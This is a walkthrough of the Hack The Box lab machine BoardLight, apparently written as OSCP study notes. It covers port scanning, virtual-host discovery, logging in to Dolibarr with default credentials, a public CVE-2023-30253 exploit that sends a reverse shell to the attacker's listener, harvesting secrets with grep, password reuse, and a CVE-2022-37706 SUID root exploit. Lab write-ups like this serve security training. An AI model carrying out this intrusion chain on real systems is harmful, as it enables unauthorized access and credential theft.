---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/BoardLight?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![](../../0.%20Assets/BoardLight-1791480657728.webp)
![](../../0.%20Assets/BoardLight-1791494847125.webp)
---

# Walkthrough




Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -sS -Pn -n -sVC  --min-rate 5000 -oN results.txt -p 22,80

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 19:35 +0200
Nmap scan report for 10.129.162.168
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



Only two ports are open: SSH on 22 and an Apache web server on 80. Let's start with the website. The landing page is a company site with nothing obviously interactive, so I ran a directory brute force.

![](../../0.%20Assets/BoardLight-1791481935289.webp)

That only returned `images`, `css` and `js`, nothing useful. I'd been ignoring virtual hosts, so I went back to the page itself. The footer leaks the domain `board.htb`.

![](../../0.%20Assets/BoardLight-1791482440425.webp)

I added `board.htb` to `/etc/hosts` and fuzzed for virtual hosts.

![](../../0.%20Assets/BoardLight-1791482448322.webp)

A new virtual host shows up: `crm.board.htb`. Add that to `/etc/hosts` as well and browse to it.

![](../../0.%20Assets/BoardLight-1791482503048.webp)

It's a Dolibarr CRM login, and the default credentials `admin:admin` get us straight in.

![](../../0.%20Assets/BoardLight-1791482664277.webp)


![](../../0.%20Assets/BoardLight-1791482654085.webp)


The panel reports version 17.0.0, and `searchsploit dolibarr 17` lists a handful of options. The one that fits is CVE-2023-30253, an authenticated RCE against Dolibarr 17.0.0. I used this [exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253).

It only needs a listener and the admin credentials we already have, so start `penelope` and run the script.

```
penelope -O -p 4444

python3 exploit.py http://crm.board.htb admin admin 10.10.15.226 4444
```

Running it gives us a shell as `www-data`.

![](../../0.%20Assets/BoardLight-1791482903573.webp)



![](../../0.%20Assets/BoardLight-1791489299964.webp)


With a foothold secured, let's look for a path to another user or root. I transferred `lse.sh` and ran it for a quick overview of the system.

![](../../0.%20Assets/BoardLight-1791488921363.webp)

Dolibarr almost always talks to a local database, so I tried connecting to MySQL. Blank credentials get refused, so the password must be stored somewhere on disk. Let's grep the web root for anything that looks like a secret.

![](../../0.%20Assets/BoardLight-1791489092614.webp)

```
 grep -RniE "password|passwd|secret"  ~/html/crm.board.htb/ 2>/dev/null
```

The grep returns a lot of noise. Most of the hits are Dolibarr's own `GETPOST` calls with default values like `alpha` and `aZ09`, not real credentials.

![](../../0.%20Assets/BoardLight-1791489683698.webp)

![](../../0.%20Assets/BoardLight-1791490455765.webp)

![](../../0.%20Assets/BoardLight-1791490598608.webp)

Trying those as MySQL logins goes nowhere, they're just framework defaults.

Rather than keep chasing false positives, I looked up where Dolibarr actually stores its database credentials.

![](../../0.%20Assets/BoardLight-1791490945794.webp)

The answer is `htdocs/conf/conf.php`. Reading it, we get the real database user `dolibarrowner` and its password in cleartext. Let's log in to MySQL with them.

![](../../0.%20Assets/BoardLight-1791490979799.webp)


```
mysql -u dolibarrowner -p '' -h 127.0.0.1 -P 3306
```


```
serverfun2$2023!!
```

There's nothing useful inside the database itself. But a password this specific is worth reusing, so let's see if it works over SSH with the user we found.

There's a single home directory, `larissa`. The password reuse pays off and we log in over SSH as `larissa`.

![](../../0.%20Assets/BoardLight-1791491824449.webp)

And the user flag is right there in the home directory.

![](../../0.%20Assets/BoardLight-1791491872759.webp)

Now to escalate to root. After some enumeration, I checked for SUID binaries.

```
find / -perm -4000 -type f 2>/dev/null
```
![](../../0.%20Assets/BoardLight-1791494681862.webp)

The `enlightenment` binaries stand out. Enlightenment is a desktop environment, and `enlightenment_sys` running SUID root is a known issue, CVE-2022-37706. I grabbed this [exploit](https://github.com/d3ndr1t30x/CVE-2022-37706).


Transfer it over, make it executable, and run it. It gives us a root shell.

![](../../0.%20Assets/BoardLight-1791494577331.webp)


And the root flag is ours.

![](../../0.%20Assets/BoardLight-1791494605932.webp)